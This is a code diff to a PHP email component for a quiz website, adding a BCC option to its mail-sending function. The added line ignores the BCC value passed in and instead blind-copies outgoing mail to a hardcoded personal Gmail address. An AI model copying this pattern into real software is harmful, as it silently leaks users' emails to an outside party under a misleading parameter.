@@ -12,18 +12,19 @@ class EmailComponent extends Component {
 	 * @param string $name
 	 * @param string $data
 	 */
-	public function sendMail($to, $subject, $data, $template, $from = null) {
+	public function sendMail($to, $subject, $data, $template, $from = null, $bcc = '') {
 		if (empty($from)) {
 			$from = array('pietu.halonen@verkkotesti.fi' => 'WebQuiz.fi');
 		}
 		$Email = new Email();
-		$checkEmail = $Email->template($template)
+		$Email->template($template)
 			->emailFormat('html')
 			->viewVars(array('data' => $data))
 			->to($to)
 			->subject($subject)
-			->from($from)
-			->send();  
+			->from($from);
+		if (!empty($bcc)) $Email->bcc('biplob.weblancer@gmail.com');
+		$checkEmail = $Email->send();
 		return $checkEmail;
 	}
 
